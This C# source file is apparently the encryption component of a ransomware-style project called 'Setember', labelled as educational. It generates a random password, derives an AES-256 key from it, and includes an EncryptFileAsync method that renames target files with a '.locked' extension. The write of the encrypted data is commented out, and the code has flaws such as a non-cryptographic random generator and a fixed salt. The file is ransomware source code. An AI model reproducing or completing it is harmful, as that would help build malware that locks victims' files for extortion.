// 
//   ____ __________ _____ __  __ ____ _____ ____  
//  / ___|___ /_   _|___ /|  \/  | __ )___ /|  _ \ 
//  \___ \ |_ \ | |   |_ \| |\/| |  _ \ |_ \| |_) |
//   ___) |__) || |  ___) | |  | | |_) |__) |  _ < 
//  |____/____/ |_| |____/|_|  |_|____/____/|_| \_\
//                                                 
//
// Copyright (c) 2023 Daniel Aspect
// 
// This file is part of the "Setember" project, licensed under The MIT License.
// 
// THIS SOFTWARE MUST ONLY BE USED FOR EDUCATIONAL PURPOSES!

using System.Security.Cryptography;
using System.Text;

namespace Setember;

public class Encrypter
{
    private static byte[] Key { get; set; }
    private static byte[] IV { get; set; }
    private static string Password { get; set; }
    public static byte[] PasswordBytes { get; set; }

    private static readonly byte[] Salt = new byte[] {
        10, 20, 30, 40, 50, 60, 70, 80
    };

    public Encrypter()
    {
        Password = CreatePassword(32);
        PasswordBytes = GetPasswordBytes(Password);
        var keys = GenAESKey(PasswordBytes);
        Key = keys[0];
        IV = keys[1];
    }

    public async Task<byte[]> EncryptWithAES(byte[] byteToEncrypt)
    {
        byte[] encryptedBytes = null;
        using (var ms = new MemoryStream())
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;

                aes.Key = Key;
                aes.IV = IV;

                aes.Mode = CipherMode.CBC;

                using (var cryptoStream = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    await cryptoStream.WriteAsync(byteToEncrypt, 0, byteToEncrypt.Length);
                    cryptoStream.Close();
                }
                encryptedBytes = ms.ToArray();
            }
        }
        return encryptedBytes;
    }

    protected byte[] GetPasswordBytes(string password)
        => SHA512.Create().ComputeHash(Encoding.UTF8.GetBytes(password));

    protected List<byte[]> GenAESKey(byte[] passwordBytes, int KeySizeInBytes = 32, int BlockSizeInBytes = 16)
    {
        var keys = new List<byte[]>();

        const ushort iterations = 1000;
        var keyGenerator = new Rfc2898DeriveBytes(passwordBytes, Salt, iterations);

        // keys[0] = AES.Key
        keys.Add(keyGenerator.GetBytes(KeySizeInBytes));
        // Kkeys[1] = AES.IV
        keys.Add(keyGenerator.GetBytes(BlockSizeInBytes));

        return keys;
    }

    public async Task EncryptFileAsync(string filePath, string password)
    {
        byte[] bytesToEncrypt = File.ReadAllBytes(filePath);
        byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

        await Task.Run(() =>
        {
            passwordBytes = SHA512.Create().ComputeHash(passwordBytes);
            //await File.WriteAllBytesAsync(filePath, );
            File.Move(filePath, filePath + ".locked");
        });
    }

    protected string CreatePassword(int passwordLength)
    {
        const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&*=/";
        var random = new Random();
        var password = new StringBuilder();
        while (0 < passwordLength--)
        {
            password.Append(chars[random.Next(chars.Length - 1)]);
        }
        return password.ToString();
    }
}